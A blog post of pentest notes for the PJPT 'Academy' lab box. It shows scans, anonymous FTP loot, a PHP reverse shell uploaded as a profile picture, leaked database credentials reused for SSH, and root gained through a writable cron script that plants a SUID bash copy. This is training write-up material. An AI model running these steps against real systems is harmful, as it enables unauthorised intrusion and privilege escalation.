---
layout: post
title: "PJPT Capstone: Academy"
author: Andrew Cherney
date: 2024-01-31 04:59:19
tags: pjpt webapp linux mysql ftp
icon: "assets/icons/pjpt.png"
post_description: "This is a part of the mid-course capstone of the PJPT. Structured more as pentest notes than an actual writeup. Goes over the classic database exfil and image upload shell."
---

# Summary

{{ page.post_description }}


10.0.69.7
### Findings

21 10.0.69.7 vsftpd 3.0.3
- Anonymous FTP Login Allowed
- Unauthenticated FTP File Retrieval
- Leaked Credentials - FTP notes.txt

<br>
22 10.0.69.7 OpenSSH 7.9p1

80 10.0.69.7 Apache httpd 2.4.38 ((Debian))

- Default Apache2 Debian Web Page - PHP
- Remote Shell - Academy Student Profile Picture Upload /academy/my-profile.php
- Insecure Passwords - Academy student password requirements  

<br>
localhost 10.0.69.7

- Leaked Credentials - mysql includes/config.php
- Insecure password - mysql database admin
- Reused Credentials - grimmie mysql & user
- User Writable Root Run Cron Job - /home/grimmie/backup.sh  
   
<br>
Profile Image Upload - http://10.0.69.7/academy/my-profile.php  
MySQL site - http://10.0.69.7/phpmyadmin/  

<br>

# Enum

### Network Scan

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $nmap -T4 -p- -A 10.0.69.7
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-25 18:47 CST
Nmap scan report for 10.0.69.7
Host is up (0.0046s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.69.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c7:44:58:86:90:fd:e4:de:5b:0d:bf:07:8d:05:5d:d7 (RSA)
|   256 78:ec:47:0f:0f:53:aa:a6:05:48:84:80:94:76:a6:23 (ECDSA)
|_  256 99:9c:39:11:dd:35:53:a0:29:11:20:c7:f8:bf:71:a4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.07 seconds
```

### FTP

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $ftp 10.0.69.7
Connected to 10.0.69.7.
220 (vsFTPd 3.0.3)
Name (10.0.69.7:raccoon): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> help
Commands may be abbreviated.  Commands are:

!		dir		mdelete		qc		site
$		disconnect	mdir		sendport	size
account		exit		mget		put		status
append		form		mkdir		pwd		struct
ascii		get		mls		quit		system
bell		glob		mode		quote		sunique
binary		hash		modtime		recv		tenex
bye		help		mput		reget		tick
case		idle		newer		rstatus		trace
cd		image		nmap		rhelp		type
cdup		ipany		nlist		rename		user
chmod		ipv4		ntrans		reset		umask
close		ipv6		open		restart		verbose
cr		lcd		prompt		rmdir		?
delete		ls		passive		runique
debug		macdef		proxy		send
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (776 bytes).
226 Transfer complete.
776 bytes received in 0.02 secs (39.7510 kB/s)
ftp> exit
221 Goodbye.
```
```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $cat note.txt 
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta
```

![](/img/academy/academy_password_crackstation.png)

### Web Scanning

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $dirsearch -u http://10.0.69.7/

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/_hacking/PJPT/Academy/reports/http_10.0.69.7/__24-01-25_18-50-48.txt

Target: http://10.0.69.7/

[18:50:48] Starting: 
[18:50:52] 403 -  274B  - /.htaccess.bak1
[18:50:52] 403 -  274B  - /.htaccess.sample
[18:50:52] 403 -  274B  - /.htaccess.save
[18:50:52] 403 -  274B  - /.htaccess_orig
[18:50:52] 403 -  274B  - /.ht_wsr.txt
[18:50:52] 403 -  274B  - /.htaccess_sc
[18:50:52] 403 -  274B  - /.htaccessBAK
[18:50:53] 403 -  274B  - /.htaccessOLD
[18:50:52] 403 -  274B  - /.htaccess_extra
[18:50:53] 403 -  274B  - /.htm
[18:50:53] 403 -  274B  - /.html
[18:50:52] 403 -  274B  - /.htaccess.orig
[18:50:53] 403 -  274B  - /.htaccessOLD2
[18:50:53] 403 -  274B  - /.htpasswds
[18:50:53] 403 -  274B  - /.httr-oauth
[18:50:53] 403 -  274B  - /.htpasswd_test
[18:50:58] 403 -  274B  - /.php
[18:52:03] 301 -  311B  - /phpmyadmin  ->  http://10.0.69.7/phpmyadmin/
[18:52:05] 200 -    3KB - /phpmyadmin/doc/html/index.html
[18:52:05] 200 -    1KB - /phpmyadmin/README
[18:52:05] 200 -   17KB - /phpmyadmin/ChangeLog
[18:52:05] 200 -    3KB - /phpmyadmin/
[18:52:05] 200 -    3KB - /phpmyadmin/index.php
[18:52:12] 403 -  274B  - /server-status/
[18:52:12] 403 -  274B  - /server-status

Task Completed
```

dirbuster scan

![](/img/academy/academy_dirbuster_scan.png)

## Manual Enum

http://10.0.69.7/phpmyadmin

![](/img/academy/academy_phpmyadmin_login_portal.png)

http://10.0.69.7/academy

![](/img/academy/academy_academy_login_portal.png)

http://10.0.69.7/academy/my-profile.php

![](/img/academy/academy_profile_registration_image_upload.png)



# Student Shell - www-data

Place a pentestmonkey php shell in upload and upload

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.0.69.7 36164
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 04:48:42 up 54 min,  0 users,  load average: 0.63, 0.53, 0.42
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (575): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/$ 
```

```bash
cat includes/config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");


?>
```



# phpmyadmin

![](/img/academy/academy_phpmyadmin_admintable.png)

![](/img/academy/academy_crackstation_admin_pass.png)



# grimmie

```bash
www-data@academy:/$ su grimmie
su grimmie
Password: My_V3ryS3cur3_P4ss
^C
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/PJPT/Academy]
└──╼ $ssh grimmie@10.0.69.7
grimmie@10.0.69.7's password: 
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jan 26 05:06:25 2024 from 10.0.69.5
grimmie@academy:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2024/01/26 05:14:12 CMD: UID=1000  PID=1920   | ./pspy64 
2024/01/26 05:14:12 CMD: UID=0     PID=1843   | 
2024/01/26 05:14:12 CMD: UID=0     PID=1842   | 
2024/01/26 05:14:12 CMD: UID=1000  PID=1739   | -bash 
2024/01/26 05:14:12 CMD: UID=1000  PID=1738   | sshd: grimmie@pts/0  
2024/01/26 05:14:12 CMD: UID=0     PID=1732   | sshd: grimmie [priv] 
2024/01/26 05:14:12 CMD: UID=1000  PID=1675   | (sd-pam) 
2024/01/26 05:14:12 CMD: UID=1000  PID=1674   | /lib/systemd/systemd --user 
2024/01/26 05:14:12 CMD: UID=33    PID=1598   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1184   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1163   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1160   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1159   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1158   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=1026   | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=999    | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=986    | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=33    PID=875    | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=106   PID=597    | /usr/sbin/mysqld 
2024/01/26 05:14:12 CMD: UID=0     PID=575    | /usr/sbin/apache2 -k start 
2024/01/26 05:14:12 CMD: UID=0     PID=531    | /usr/sbin/sshd -D 
2024/01/26 05:14:12 CMD: UID=0     PID=520    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2024/01/26 05:14:12 CMD: UID=0     PID=515    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2024/01/26 05:14:12 CMD: UID=0     PID=470    | /sbin/dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2024/01/26 05:14:12 CMD: UID=0     PID=376    | /usr/sbin/cron -f 
2024/01/26 05:14:12 CMD: UID=0     PID=375    | /lib/systemd/systemd-logind 
2024/01/26 05:14:12 CMD: UID=104   PID=374    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2024/01/26 05:14:12 CMD: UID=0     PID=373    | /usr/sbin/rsyslogd -n -iNONE 
2024/01/26 05:14:12 CMD: UID=0     PID=371    | 
2024/01/26 05:14:12 CMD: UID=0     PID=370    | 
2024/01/26 05:14:12 CMD: UID=101   PID=336    | /lib/systemd/systemd-timesyncd 
2024/01/26 05:14:12 CMD: UID=0     PID=315    | /lib/systemd/systemd-udevd 
2024/01/26 05:14:12 CMD: UID=0     PID=295    | /lib/systemd/systemd-journald 
2024/01/26 05:14:12 CMD: UID=0     PID=264    | 
2024/01/26 05:14:12 CMD: UID=0     PID=263    | 
2024/01/26 05:14:12 CMD: UID=0     PID=2      | 
2024/01/26 05:14:12 CMD: UID=0     PID=1      | /sbin/init 
2024/01/26 05:15:01 CMD: UID=0     PID=1927   | /usr/sbin/CRON -f 
2024/01/26 05:15:01 CMD: UID=0     PID=1928   | /usr/sbin/CRON -f 
2024/01/26 05:15:01 CMD: UID=0     PID=1929   | /bin/sh -c /home/grimmie/backup.sh 
2024/01/26 05:15:01 CMD: UID=0     PID=1930   | /bin/bash /home/grimmie/backup.sh 
2024/01/26 05:15:01 CMD: UID=0     PID=1931   | /bin/bash /home/grimmie/backup.sh 
2024/01/26 05:15:01 CMD: UID=0     PID=1932   | /bin/bash /home/grimmie/backup.sh 
2024/01/26 05:15:01 CMD: UID=0     PID=1933   | /bin/bash /home/grimmie/backup.sh 
2024/01/26 05:15:01 CMD: UID=0     PID=1934   | /bin/bash /home/grimmie/backup.sh 
grimmie@academy:~$ nano backup.sh
grimmie@academy:~$ /home/grimmie/shell -p
shell-5.0# whoami
root
shell-5.0# ls /root
flag.txt
shell-5.0# cat /root/flag.txt 
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !

```

```bash
backup.sh
#!/bin/bash

rm /tmp/backup.zip
zip -r /tmp/backup.zip /var/www/html/academy/includes
chmod 700 /tmp/backup.zip

cp /bin/bash /home/grimmie/shell
chmod u+s /home/grimmie/shell
```








